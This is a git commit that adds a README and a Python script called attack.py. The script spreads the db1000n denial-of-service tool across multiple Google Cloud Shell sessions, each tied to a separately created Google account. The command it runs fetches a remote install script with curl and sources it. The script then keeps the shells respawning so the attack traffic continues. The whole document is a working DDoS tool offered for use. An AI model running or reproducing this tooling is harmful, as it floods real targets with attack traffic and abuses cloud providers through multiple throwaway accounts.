ddcbebe51114a3a1a31a20a33fd0f98510335916
Arkadiy Parovozov <arkadiy2.arkadiy2@gmail.com>
2022-06-04 19:48:46 +0300

    initial commit

---
+++ README.md
@@ -0,0 +1,33 @@
+### attack with needles via gshells 
+- https://shell.cloud.google.com
+- https://github.com/Arriven/db1000n
+
+### how to set up
+- install gcloud cli
+
+  https://cloud.google.com/sdk/docs/install
+- create google accounts
+
+  https://accounts.google.com/signup/v2/webcreateaccount?biz=false&flowEntry=SignUp
+- create gcloud configurations and authorize with google accounts
+
+  ``gcloud config configurations create {config_name} && gcloud auth login``
+
+### how to use
+  ``python attack.py --attack_time=18000 --shells_num=8 --needles_args="-log-format console"``
+  
+  ``python attack.py --attack_time=18000 --shells_num=8``
+  
+  ``python attack.py --shells_num=8``
+
+  ```python attack.py --help
+     usage: attack.py [-h] [--attack_time ATTACK_TIME] [--shells_num SHELLS_NUM] [--needles_args NEEDLES_ARGS]
+
+     attack with needles via gshells
+
+     optional arguments:
+      -h, --help                    show this help message and exit
+      --attack_time ATTACK_TIME     minimum attack time in seconds (default: 1)
+      --shells_num SHELLS_NUM       a number of gshells (default: 4)
+      --needles_args NEEDLES_ARGS   db1000n arguments (default: )
+  ```
---
+++ attack.py
@@ -0,0 +1,143 @@
+"""
+attack with needles via gshells
+
+"""
+
+import argparse
+import logging
+import os
+import shlex
+import subprocess
+import sys
+import time
+
+logging.getLogger().setLevel(logging.INFO)
+
+ATTACK_COMMAND = (
+    'gcloud cloud-shell ssh --authorize-session '
+    '--command="source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) '
+    '&& ./db1000n {}"'
+)
+
+
+class Attack:
+    """
+    class to attack with needles via gshells
+
+    """
+
+    def __init__(self):
+        self.configurations = iter([])
+        self.shells_num = 0
+        self.processes = []
+
+    def make_configurations(self, shells_num):
+        """
+        makes gcloud configurations
+
+        :param shells_num: a number of gshells
+
+        """
+        process = subprocess.Popen(
+            shlex.split('gcloud config configurations list'),
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        configs = [
+            x for x in process.stdout.readlines()[1:] if not x.startswith(b'default')
+        ]
+        if configs:
+            configs = [
+                x.split()[0].decode() for x in configs
+            ]
+            logging.info('gcloud configurations: %s', ", ".join(configs))
+
+            self.configurations = iter(configs)
+            self.shells_num = min(len(configs), shells_num)
+        else:
+            logging.warning('there is no gcloud configuration')
+
+    def make_process(self, needles_args):
+        """
+        makes process with ssh connect to gshell and runs command
+
+        :param needles_args: db1000n arguments
+
+        """
+        configuration = next(self.configurations, None)
+        if configuration:
+            os.makedirs('logs', exist_ok=True)
+            with open(f'logs{os.sep}configuration_{configuration}.log', 'wb') as log:
+                process = subprocess.Popen(
+                    shlex.split(ATTACK_COMMAND.format(needles_args)),
+                    env={
+                        **dict(os.environ),
+                        'CLOUDSDK_ACTIVE_CONFIG_NAME': configuration,
+                    },
+                    stdout=log,
+                    stderr=log
+                )
+                logging.info(
+                    'gcloud configuration %s: attack started, pid %d',
+                    configuration,
+                    process.pid
+                )
+                self.processes.append(process)
+
+    def start(self, needles_args):
+        """
+        starts attack with needles via gshells
+
+        :param needles_args: db1000n arguments
+
+        """
+        for _ in range(self.shells_num):
+            self.make_process(needles_args)
+
+        while self.processes:
+            for process in self.processes:
+                code = process.poll()
+
+                if code is not None:
+                    self.processes.remove(process)
+                    logging.info('attack finished, pid %d, return code: %d', process.pid, code)
+
+                if len(self.processes) < self.shells_num:
+                    self.make_process(needles_args)
+
+            time.sleep(5.)
+
+
+def main():
+    """
+    attacks with needles via gshells
+
+    """
+    parser = argparse.ArgumentParser(
+        description='attack with needles via gshells',
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter
+    )
+    parser.add_argument('--attack_time', type=int, default=1, help='minimum attack time in seconds')
+    parser.add_argument('--shells_num', type=int, default=4, help='a number of gshells')
+    parser.add_argument('--needles_args', type=str, default='', help='db1000n arguments')
+    args = parser.parse_args()
+
+    attack = Attack()
+    start_time = time.time()
+
+    try:
+        logging.info('press ctrl+c to stop attack')
+        while (time.time() - start_time) < args.attack_time:
+            attack.make_configurations(args.shells_num)
+            attack.start(args.needles_args)
+
+    except KeyboardInterrupt:
+        for process in attack.processes:
+            process.terminate()
+
+        logging.info('attack interrupted')
+        sys.exit()
+
+
+if __name__ == '__main__':
+    main()
